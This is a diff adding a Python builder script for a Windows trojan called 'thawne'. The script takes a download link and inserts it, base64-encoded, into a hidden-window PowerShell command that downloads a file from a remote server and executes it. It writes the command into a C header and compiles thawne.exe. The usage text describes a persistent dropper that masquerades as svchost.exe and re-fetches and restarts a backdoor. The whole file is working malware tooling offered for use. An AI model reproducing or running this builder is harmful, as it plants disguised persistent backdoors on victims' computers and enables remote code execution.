@@ -1,0 +1,107 @@
+#!/usr/bin/python3
+
+"""
+
+Have a good time reading the source. You are an amazing person.
+
+"""
+## TODO: Add script
+import sys
+from colorama import Fore,Style
+import colorama
+import base64
+import subprocess
+import os
+
+banner = r"""
+
+			zeeeeee-
+			z$$$$$$"
+		   d$$$$$$"
+		  d$$$$$P
+		 d$$$$$P
+		$$$$$$"
+	  .$$$$$$"
+	 .$$$$$$"
+	4$$$$$$$$$$$$$"
+   z$$$$$$$$$$$$$"
+   """""""3$$$$$"
+		 z$$$$P
+		d$$$$"
+	  .$$$$$"
+	 z$$$$$"
+	z$$$$P
+   d$$$$$$$$$$"
+  *******$$$"
+	   .$$$"
+	  .$$"
+	 4$P"
+	z$"
+   zP
+  z"
+ /   
+^
+"""
+def __main__():
+	
+	def pbanner():
+		print(Style.BRIGHT + Fore.LIGHTRED_EX) 
+		print(banner)
+		print(Style.BRIGHT + Fore.GREEN)
+
+	pbanner()
+	try:
+		http_link = sys.argv[1]
+		filename = sys.argv[2]
+		filepath = sys.argv[3]
+
+		powershell = "powershell.exe -windowstyle hidden $a = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{source}')); (new-object System.Net.WebClient).DownloadFile($a,'{dest}'); Start-Process '{dest}'"
+		
+		print("[ OK ] Base64 Encoding '" + http_link + "' ...")
+		encoded = base64.b64encode(http_link.encode())
+		print("[ OK ] Base64 Encoded '" + encoded.decode() + "' ...")
+		print("[ OK ] Creating Powershell Payload.")
+		first = powershell.replace("{source}", encoded.decode())
+		second = first.replace("{dest}", filepath)
+		print("[ OK ] Done.")
+		print("[ OK ] FULL Payload : ")
+		print("[ ~~ ] " + second)
+		print("[ ++ ] Hardcoding Paths and Payload in Trojan.")
+		with open("thawnesrc/thawnec.h", "r") as header:
+			data = header.read()
+			new = data.replace("{payload}", second)
+			newtwo = new.replace("{filename}", filename)
+			final = newtwo.replace("{path}", filepath)
+			with open("thawnesrc/thawne.h", "w") as new_header:
+				new_header.write(final)
+				print("[ OK ] Done.")
+		
+		print("[ OK ] Compiling, Please wait.")
+		if(os.name == "nt"):
+			subprocess.run(["make", "-f", "thawnesrc/makefile"], stdout=open(os.devnull,"w"), stderr=subprocess.STDOUT)
+		else:
+			subprocess.run(["make", "-f", "thawnesrc/makefile", "linux"], stdout=open(os.devnull,"w"), stderr=subprocess.STDOUT)
+
+		try:
+			with open("thawne.exe", "r") as test:
+				print("[ OK ] Built 'thawne.exe' with a total size of " + str(os.path.getsize("thawne.exe")) + " bytes.")
+				os.remove("thawnesrc/thawne.h")
+		except FileNotFoundError:
+			print("[ X ] Compilation Error.")
+	except IndexError:
+		print("""
+USAGE : ./thawne <download link> <File name only> < Full file path > 
+
+EXAMPLE : ./thawne http://www.myserver/backupbackdoor.exe svchost.exe C:/Users/user/AppData/Roaming/hacker/svchost.exe
+|
+|_ This will generate a Trojan that will check if svchost.exe is running and exists on the path you specified,
+	it activates if the file is not running, It will execute it.
+	If it does not exist, Download it to the same Paths from the link you specified.
+	And Start-Over.
+		""")
+
+	except Exception as e:
+		print("[X] Error : " + str(e))
+
+if __name__ == '__main__':  
+	__main__()
